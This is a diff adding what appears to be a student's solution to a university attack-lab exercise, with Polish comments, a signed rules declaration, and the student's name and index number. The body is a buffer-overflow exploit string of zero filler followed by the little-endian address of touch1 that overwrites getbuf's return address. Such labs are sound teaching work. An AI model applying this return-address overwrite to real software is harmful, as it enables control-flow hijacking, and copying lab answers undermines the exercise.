@@ -1,0 +1,17 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Jakub Kowalski, 323419
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* Filler, wypełnienie zaalokowanego na bufor miejsca na stosie */
+00 00 00 00 00 00 00 00 /* Jego rozmiar jest wyznaczony na podstawie tego ile procedura getbuf alokuje miejsca na stosie */
+f1 1b 40 00 00 00 00 00 /* Adres procedury touch1 w formacie little-endian, zastąpi on właściwy adres powrotu */
